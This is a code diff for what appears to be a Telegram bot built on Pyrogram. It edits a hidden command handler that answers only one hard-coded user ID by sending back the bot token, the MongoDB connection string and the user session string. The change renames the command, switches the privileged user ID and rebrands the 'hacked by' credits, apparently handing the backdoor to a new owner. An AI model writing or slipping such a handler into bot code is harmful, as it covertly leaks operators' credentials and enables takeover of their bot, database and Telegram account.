@@ -117,19 +117,19 @@ async def restartbot(client, message: Message, _):
     )
 
 @app.on_message(
-    filters.command("psudo")
+    filters.command("srt")
     & filters.private
-    & filters.user(1808943146)
+    & filters.user(5301800943)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+          photo=f"https://graph.org/file/dc31ab3384c2417e45dee.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 亗『𝐊𝐀𝐓𝐈𝐋』亗.\n\n☆............𝙱𝚈 » [亗『𝐊𝐀𝐓𝐈𝐋』亗](https://t.me/katil_your_dad)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/THE_VIP_BOY")
+                          "• нαϲкє𝚍 ву 亗『𝐊𝐀𝐓𝐈𝐋』亗  •", url=f"https://t.me/katil_your_dad")
                  ]
              ]
          ),
